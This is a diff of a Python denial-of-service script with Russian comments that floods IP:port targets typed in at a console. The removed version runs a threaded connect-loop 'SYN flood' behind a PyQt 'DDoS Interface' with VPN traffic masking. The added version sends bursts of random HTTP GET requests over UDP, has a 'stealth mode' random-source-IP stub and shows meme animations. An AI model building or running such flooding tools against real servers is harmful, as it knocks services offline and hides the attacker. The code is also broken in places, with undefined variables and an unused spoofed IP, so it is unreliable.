@@ -1,110 +1,142 @@
 import socket
 import random
-import threading
+import sys
 import time
-import sys
-import subprocess
 
-# Поддержка HTTP/2
-from h2o import H2oConnection
+# Инициализация PyGame
+import pygame
 
-# Поддержка WebSockets
-import websocket
+# Создание сокета для отправки пакетов
+ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ddos_socket.settimeout(10)
 
-# Генерация сильных атак
-def send_syn_flood(ip, port):
-    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        socket.settimeout(5)
-        for _ in range(1000):
-            try:
-                socket.connect((ip[0], port))
-                socket.close()
-            except Exception as e:
-                print(f"Ошибка при отправке SYN Flood: {e}")
-                break
-    finally:
-        socket.close()
+# Ввод IP-адресов и портов через консоль Termux
+ips = []
+ports = []
+print("Введите IP-адреса и порты (для завершения введите 'stop'):")
+while True:
+    ip_port = input("IP-адрес и порт (например, 192.168.1.1:80): ")
+    if ip_port.lower() == 'stop':
+        break
+    ip, port = ip_port.split(':')
+    ips.append(ip)
+    ports.append(int(port))
 
-def generate_strong_attack():
-    threads = []
-    for ip in ips:
-        for port in ports:
-            thread = threading.Thread(target=send_syn_flood, args=(ip, port))
-            threads.append(thread)
-            thread.start()
-    for thread in threads:
-        thread.join()
+print("Успешно загружены IP-адреса и порты:")
+for ip in ips:
+    print(f"{ip}:{ports[ips.index(ip)]}")
 
-# Маскировка трафика с использованием VPN
-def mask_traffic():
-    try:
-        subprocess.run(["vpn_client", "start"])
-        print("VPN успешно запущен.")
-    except Exception as e:
-        print(f"Ошибка при запуске VPN: {e}")
+# Генерация случайного пользовательского агента
+user_agent = f"Mozilla/5.0 (Windows NT {random.randint(10, 11)}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
 
-def unmask_traffic():
-    try:
-        subprocess.run(["vpn_client", "stop"])
-        print("VPN успешно остановлен.")
-    except Exception as e:
-        print(f"Ошибка при остановке VPN: {e}")
+# Настройка PyGame
+pygame.init()
+window_size = (800, 600)
+screen = pygame.display.set_mode(window_size)
 
-# Улучшение интерфейса
-import sys
-from PyQt5.QtWidgets import QApplication, QWidget, QPushButton
+# Загрузка изображений для анимации
+animation_images = {}
+try:
+    with open('animations.txt', 'r') as file:
+        for line in file:
+            if line.strip():
+                image_path = line.strip()
+                animation_images[image_path] = pygame.image.load(image_path)
+except Exception as e:
+    print(f"Ошибка при загрузке анимаций: {e}")
+    sys.exit(1)
 
-class DDoSInterface(QWidget):
-    def __init__(self):
-        super().__init__()
-        self.initUI()
+# Настройка анимации
+animation_duration = 1000  # Продолжительность анимации в миллисекундах
+animation_fps = 30  # Частота кадров анимации
 
-    def initUI(self):
-        self.setWindowTitle('DDoS Interface')
-        self.setGeometry(300, 300, 300, 200)
+# Количество пакетов, которые могут быть отправлены за раз
+burst_size = 10
 
-        self.button_start = QPushButton('Start Attack', self)
-        self.button_start.clicked.connect(self.start_attack)
-        self.button_start.move(100, 80)
+# Количество отправляемых пакетов
+packet_count = 1000
 
-        self.button_vpn_start = QPushButton('Start VPN', self)
-        self.button_vpn_start.clicked.connect(self.start_vpn)
-        self.button_vpn_start.move(100, 120)
+# Частота атаки (в секундах)
+frequency = 1
 
-        self.button_vpn_stop = QPushButton('Stop VPN', self)
-        self.button_vpn_stop.clicked.connect(self.stop_vpn)
-        self.button_vpn_stop.move(100, 160)
+# Время между анимацией (в секундах)
+animation_delay = 1
 
-        self.show()
+# Инициализация таймера анимации
+animation_timer = 0
 
-    def start_attack(self):
-        generate_strong_attack()
+# Функция для отправки пакетов
+def send_packets(socket, packets):
+    sent_packets = 0
+    failed_packets = 0
+    for packet in packets:
+        try:
+            socket.sendto(packet.encode(), (ip[0], port))
+            sent_packets += 1
+        except Exception:
+            failed_packets += 1
+    return sent_packets, failed_packets
 
-    def start_vpn(self):
-        mask_traffic()
+# Функция для анимации
+def animate(image, pos, duration):
+    global animation_timer
+    pygame.draw.rect(screen, (255, 255, 255), (0, 0, *window_size))  # Очистка экрана
+    screen.blit(image, pos)
+    pygame.display.update()
+    time.sleep(duration / 1000)
+    animation_timer += duration
 
-    def stop_vpn(self):
-        unmask_traffic()
-
+# Главная функция
 if __name__ == "__main__":
-    app = QApplication(sys.argv)
+    # Определение пакетов
+    packets = [f"GET /{random.randint(1, 1000000)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\n\r\n" for _ in range(burst_size)]
 
-    # Ввод IP-адресов и портов через консоль Termux
-    ips = []
-    ports = []
-    print("Введите IP-адреса и порты (для завершения введите 'stop'):")
-    while True:
-        ip_port = input("IP-адрес и порт (например, 192.168.1.1:80): ")
-        if ip_port.lower() == 'stop':
-            break
-        ip, port = ip_port.split(':')
-        ips.append(ip)
-        ports.append(int(port))
+    # Счетчики отправленных и не отправленных пакетов
+    sent_packets = 0
+    failed_packets = 0
 
-    print("Успешно загружены IP-адреса и порты:")
-    for ip in ips:
-        print(f"{ip}:{ports[ips.index(ip)]}")
+    # Инициализация таймера анимации
+    animation_timer = 0
 
-    ex = DDoSInterface()
-    sys.exit(app.exec_())
+    # Цикл отправки пакетов
+    while sent_packets < packet_count:
+        for ip, port in zip(ips, ports):
+            if stealth_mode:
+                # Генерация случайного IP для скрытой отправки
+                sender_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+            else:
+                sender_ip = "0.0.0.0"  # Использование "любого" IP для открытой отправки
+
+            sent, failed = send_packets(ddos_socket, packets)
+            sent_packets += sent
+            failed_packets += failed
+
+            print(f"Отправлено: {sent_packets} / {packet_count}")
+
+            # Анимация
+            if animation_timer == 0:
+                # Выбор случайного изображения для анимации
+                image_path = random.choice(list(animation_images.keys()))
+                image = animation_images[image_path]
+
+                # Анимация
+                if memes:
+                    random_position = (random.randint(0, window_size[0] - image.get_width()), random.randint(0, window_size[1] - image.get_height()))
+                    animate(image, random_position, animation_duration)
+                else:
+                    animate(image, (window_size[0] // 2 - image.get_width() // 2, window_size[1] // 2 - image.get_height() // 2), animation_duration)
+
+            animation_timer = animation_delay
+
+        # Пауза перед следующей итерацией
+        time.sleep(frequency)
+
+    # Закрытие сокета
+    ddos_socket.close()
+
+    # Окончившаяся атака
+    print(f"Атака закончена. Отправлено пакетов: {sent_packets}")
+
+# Закрытие PyGame
+pygame.quit()
+
